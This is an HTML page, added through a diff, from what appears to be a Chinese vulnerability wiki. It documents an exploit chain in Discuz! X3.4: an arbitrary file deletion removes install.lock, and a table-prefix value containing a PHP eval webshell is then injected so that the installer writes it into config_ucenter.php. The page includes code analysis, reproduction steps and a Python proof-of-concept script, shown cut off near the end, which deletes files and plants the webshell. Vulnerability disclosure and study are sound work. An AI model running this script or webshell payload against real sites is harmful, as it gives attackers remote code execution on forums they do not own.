@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz! X3.4 任意文件删除配合install过程getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz! X3.4 \u4efb\u610f\u6587\u4ef6\u5220\u9664\u914d\u5408install\u8fc7\u7a0bgetshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/" class="btn btn-xs btn-link">
+        Discuz! X3.4 前台ssrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X3.4 任意文件删除漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-x34-installgetshell">Discuz! X3.4 任意文件删除配合install过程getshell<a class="headerlink" href="#discuz-x34-installgetshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>**可以利用的条件：**1、安装后没有登录后台，此时install/index还没删除
+2、因为其他原因没有删除</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Discuz! X3.4</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>这个方法是看到一篇博客分析的，主要是利用文件删除漏洞删掉<code>install.lock</code>文件，绕过对安装完成的判断能够再进行安装的过程，然后再填写配置信息处构使用构造的表前缀名，时一句话写入配置文件中，getshell。</p>
+<p>表前缀：<code>x');@eval($_POST[lanvnal]);('</code></p>
+<p>但是我在使用上面版本v3.4的代码时发现，安装后<code>install</code>目录下不存在<code>index.php</code>了。分析代码发现会有安装后的删除处理，在<code>/source/admincp/admincp_index.php</code>的第14行：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="p">(</span><span class="nv">@file_exists</span><span class="p">(</span><span class="n">DISCUZ_ROOT</span><span class="p">.</span><span class="s1">&#39;./install/index.php&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="err">!</span><span class="n">DISCUZ_DEBUG</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
+<span class="w">    </span><span class="nv">@unlink</span><span class="p">(</span><span class="n">DISCUZ_ROOT</span><span class="p">.</span><span class="s1">&#39;./install/index.php&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nv">@file_exists</span><span class="p">(</span><span class="n">DISCUZ_ROOT</span><span class="p">.</span><span class="s1">&#39;./install/index.php&#39;</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
+<span class="w">        </span><span class="n">dexit</span><span class="p">(</span><span class="s1">&#39;Please delete install/index.php via FTP!&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="err">}</span>
+<span class="err">}</span>
+</code></pre></div>
+
+<p>那是不是老版本存在该问题呢？</p>
+<p>我翻了历史版本代码，直到git提交的第一个版本都有如上的处理。</p>
+<p>但还是分析一下吧，就当学习了。</p>
+<p>**可以利用的条件：**1、安装后没有登录后台，此时install/index还没删除
+2、因为其他原因没有删除</p>
+<p>分析一下安装逻辑，<code>install/index.php</code>文件的整体流程如下：</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/media/rId25.png" /></p>
+<p>分别是我们安装的每一步，接受协议-&gt;环境检测-&gt;是否安装 UCenter
+Server-&gt;数据库配置信息-&gt;安装过程，生成lock文件-&gt;检查</p>
+<p>问题出在在 <code>db_init</code> 的处理中，在代码第369行：</p>
+<div class="codehilite"><pre><span></span><code>if(DZUCFULL) {
+            install_uc_server();
+        }
+</code></pre></div>
+
+<p>跟进<code>install_uc_server</code>，在1296行可以发现对config参数没做任何过滤传入到<code>save_uc_config</code>中：</p>
+<div class="codehilite"><pre><span></span><code>save_uc_config($config, ROOT_PATH.&#39;./config/config_ucenter.php&#39;);
+</code></pre></div>
+
+<p>然后<code>save_uc_config</code>也没做任何安全处理，就拼接参数后写入文件：</p>
+<div class="codehilite"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">save_uc_config</span><span class="p">(</span><span class="nx">$config</span><span class="p">,</span><span class="w"> </span><span class="nx">$file</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="nx">$success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">list</span><span class="p">(</span><span class="nx">$appauthkey</span><span class="p">,</span><span class="w"> </span><span class="nx">$appid</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbhost</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbname</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbuser</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbpw</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbcharset</span><span class="p">,</span><span class="w"> </span><span class="nx">$uctablepre</span><span class="p">,</span><span class="w"> </span><span class="nx">$uccharset</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucapi</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucip</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$config</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">$link</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_connect&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">mysql_connect</span><span class="p">(</span><span class="nx">$ucdbhost</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbuser</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbpw</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">mysqli</span><span class="p">(</span><span class="nx">$ucdbhost</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbuser</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbpw</span><span class="p">,</span><span class="w"> </span><span class="nx">$ucdbname</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">$uc_connnect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$link</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">&#39;mysql&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">$date</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">gmdate</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">time</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">3600</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">8</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">$year</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">date</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">$config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="nx">EOT</span>
+<span class="cp">&lt;?php</span>
+
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_CONNECT&#39;</span><span class="p">,</span> <span class="s1">&#39;$uc_connnect&#39;</span><span class="p">);</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_DBHOST&#39;</span><span class="p">,</span> <span class="s1">&#39;$ucdbhost&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_DBUSER&#39;</span><span class="p">,</span> <span class="s1">&#39;$ucdbuser&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_DBPW&#39;</span><span class="p">,</span> <span class="s1">&#39;$ucdbpw&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_DBNAME&#39;</span><span class="p">,</span> <span class="s1">&#39;$ucdbname&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_DBCHARSET&#39;</span><span class="p">,</span> <span class="s1">&#39;$ucdbcharset&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_DBTABLEPRE&#39;</span><span class="p">,</span> <span class="s1">&#39;`$ucdbname`.$uctablepre&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_DBCONNECT&#39;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_CHARSET&#39;</span><span class="p">,</span> <span class="s1">&#39;$uccharset&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_KEY&#39;</span><span class="p">,</span> <span class="s1">&#39;$appauthkey&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_API&#39;</span><span class="p">,</span> <span class="s1">&#39;$ucapi&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_APPID&#39;</span><span class="p">,</span> <span class="s1">&#39;$appid&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_IP&#39;</span><span class="p">,</span> <span class="s1">&#39;$ucip&#39;</span><span class="p">);</span>
+<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;UC_PPP&#39;</span><span class="p">,</span> <span class="mi">20</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+<span class="nx">EOT</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">$fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fopen</span><span class="p">(</span><span class="nx">$file</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;w&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">fwrite</span><span class="p">(</span><span class="nx">$fp</span><span class="p">,</span><span class="w"> </span><span class="nx">$config</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">fclose</span><span class="p">(</span><span class="nx">$fp</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">$success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">$success</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>因为 <code>dbhost, dbuser</code>等参数需要用来连接数据库，所以利用 <code>tablepre</code>
+向配置文件写入shell。</p>
+<h3 id="_5">漏洞复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>如果安装后<code>install/index.php</code>因为某些原因还存在，直接访问会有如下警告：</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/media/rId27.png" /></p>
+<p>通过文件删除漏洞删除data目录下的<code>install.lock</code>文件就可以重新安装。</p>
+<p>安装过程修改表前缀内容为：<code>x');@eval($_POST[lanvnal]);('</code></p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/media/rId28.png" /></p>
+<p>在<code>config/config_ucenter.php</code>中已经写入了webshell。</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/media/rId29.png" /></p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/media/rId30.png" /></p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+<span class="n">randstr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="nb">len</span><span class="o">=</span><span class="mi">5</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">))</span>
+
+<span class="c1">##################################################</span>
+<span class="c1">########## Customize these parameters ############</span>
+<span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://localhost/discuzx&#39;</span>
+<span class="c1"># login target site first, and copy the cookie here</span>
+<span class="n">cookie</span> <span class="o">=</span> <span class="s2">&quot;UM_distinctid=15bcd2339e93d6-07b5ae8b41447e-8373f6a-13c680-15bcd2339ea636; CNZZDATA1261218610=1456502094-1493792949-%7C1494255360; csrftoken=NotKIwodOQHO0gdMyCAxpMuObjs5RGdeEVxRlaGoRdOEeMSVRL0sfeTBqnlMjtlZ; Zy4Q_2132_saltkey=I9b3k299; Zy4Q_2132_lastvisit=1506763258; Zy4Q_2132_ulastactivity=0adb6Y1baPukQGRVYtBOZB3wmx4nVBRonRprfYWTiUaEbYlKzFWL; Zy4Q_2132_nofavfid=1; Zy4Q_2132_sid=rsQrgQ; Zy4Q_2132_lastact=1506787935</span><span class="si">%09ho</span><span class="s2">me.php%09misc; 7Csx_2132_saltkey=U8nrO8Xr; TMT0_2132_saltkey=E3q5BpyX; PXMk_2132_saltkey=rGBnNWu7; b4Gi_2132_saltkey=adC4r05k; b4Gi_2132_lastvisit=1506796139; b4Gi_2132_onlineusernum=2; b4Gi_2132_sendmail=1; b4Gi_2132_seccode=1.8dab0a0c4ebfda651b; b4Gi_2132_sid=BywqMy; b4Gi_2132_ulastactivity=51c0lBFHqkUpD3mClFKDxwP%2BI0JGaY88XWTT1qtFBD6jAJUMphOL; b4Gi_2132_auth=6ebc2wCixg7l</span><span class="si">%2F</span><span class="s2">6No7r54FCvtNKfp1e5</span><span class="si">%2F</span><span class="s2">Adz2SlLqJRBimNpgrbxhSEnsH5%2BgP2mAvwVxOdrrpVVX3W5PqDhf; b4Gi_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; b4Gi_2132_creditbase=0D0D0D0D0D0D0D0D0; b4Gi_2132_creditrule=</span><span class="si">%E</span><span class="s2">6%AF</span><span class="si">%8F%E</span><span class="s2">5%A4%A9</span><span class="si">%E</span><span class="s2">7</span><span class="si">%99%</span><span class="s2">BB</span><span class="si">%E</span><span class="s2">5%BD%95; b4Gi_2132_lastcheckfeed=1%7C1506800134; b4Gi_2132_checkfollow=1; b4Gi_2132_lastact=1506800134%09misc.php</span><span class="si">%09s</span><span class="s2">eccode&quot;</span>
+<span class="n">shell_password</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">()</span>
+<span class="n">db_host</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">db_user</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">db_pw</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="n">db_name</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="c1">#################################################</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="s1">&#39;/home.php?mod=spacecp&amp;ac=profile&amp;op=base&#39;</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="n">path</span>
+
+<span class="n">sess</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span>
+    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="n">url</span><span class="p">})</span>
+
+
+<span class="c1"># sess.proxies.update({&#39;http&#39;: &#39;socks5://localhost:1080&#39;})</span>
+<span class="c1"># sess.proxies.update({&#39;http&#39;: &#39;http://localhost:8080&#39;})</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;Cookie&#39;</span><span class="p">:</span> <span class="n">cookie</span><span class="p">})</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">get_form_hash</span><span class="p">():</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&quot;member.php\?mod=logging&amp;amp;action=logout&amp;amp;formhash=(.*?)&quot;&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">tamper</span><span class="p">(</span><span class="n">formhash</span><span class="p">,</span> <span class="n">file_to_delete</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;formhash&#39;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">formhash</span><span class="p">),</span>
+        <span class="s1">&#39;profilesubmit&#39;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;true&#39;</span><span class="p">),</span>
+        <span class="s1">&#39;birthprovince&#39;</span><span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="n">file_to_delete</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;parent.show_success&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;tamperred successfully&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">True</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">delete</span><span class="p">(</span><span class="n">formhash</span><span class="p">,</span> <span class="n">file</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">tamper</span><span class="p">(</span><span class="n">formhash</span><span class="p">,</span> <span class="n">file</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="n">image</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAADUlEQVR4nGNgGAWkAwABNgABVtF/yAAAAABJRU5ErkJggg==&#39;</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;formhash&#39;</span><span class="p">:</span> <span class="n">formhash</span><span class="p">,</span>
+        <span class="s1">&#39;profilesubmit&#39;</span><span class="p">:</span> <span class="s1">&#39;true&#39;</span>
+    <span class="p">}</span>
+    <span class="n">files</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;birthprovince&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;image.png&#39;</span><span class="p">,</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">image</span><span class="p">),</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;parent.show_success&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;delete </span><span class="si">{}</span><span class="s1"> successfully&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">file</span><span class="p">))</span>
+        <span class="k">return</span> <span class="kc">True</span>
+
+
+<span class="k">def</span><span class="w"> </span><span class="nf">getshell</span><span class="p">():</span>
+    <span class="n">install_url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/install/index.php&#39;</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">install_url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;安装向导&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;install directory not exists&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+
+    <span class="n">table_prefix</span> <span class="o">=</span> <span class="s2">&quot;x&#39;);@eval($_POST[</span><span class="si">{}</span><span class="s2">]);(&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">shell_password</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;step&#39;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+        <span class="s1">&#39;install_ucenter&#39;</span><span class="p">:</span> <span class="s1">&#39;yes&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;dbinfo[dbhost]&#39;</span><span class="p">:</span> <span class="n">db_host</span><span class="p">,</span>
+        <span class="s1">&#39;dbinfo[dbname]&#39;</span><span class="p">:</span> <span class="n">db_name</span><span class="p">,</span>
+        <span class="s1">&#39;dbinfo[dbuser]&#39;</span><span class="p">:</span> <span class="n">db_user</span><span class="p">,</span>
+        <span class="s1">&#39;dbinfo[dbpw]&#39;</span><span class="p">:</span> <span class="n">db_pw</span><span class="p">,</span>
+        <span class="s1">&#39;dbinfo[tablepre]&#39;</span><span class="p">:</span> <span class="n">table_prefix</span><span class="p">,</span>
+        <span class="s1">&#39;dbinfo[adminemail]&#39;</span><span class="p">:</span> <span class="s1">&#39;admin@admin.com&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;admininfo[username]&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;admininfo[password]&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;admininfo[password2]&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span>
+        <span class="s1">&#39;admininfo[email]&#39;</span><span class="p">:</span> <span class="s1">&#39;admin@admin.com&#39;</span><span class="p">,</span>
+    <span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">install_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s1">&#39;建立数据表 CREATE TABLE&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;write shell failed&#39;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;shell: </span><span class="si">{}</span><span class="s1">/config/config_ucenter.php&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;password: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">shell_password</span><span class="p">))</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">login</span><span class="p">()</span>
+    <span class="n">form_hash</span> <span class="o">=</span> <span class="n">get_form_hash</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">form_hash</span><span class="p">:</span>
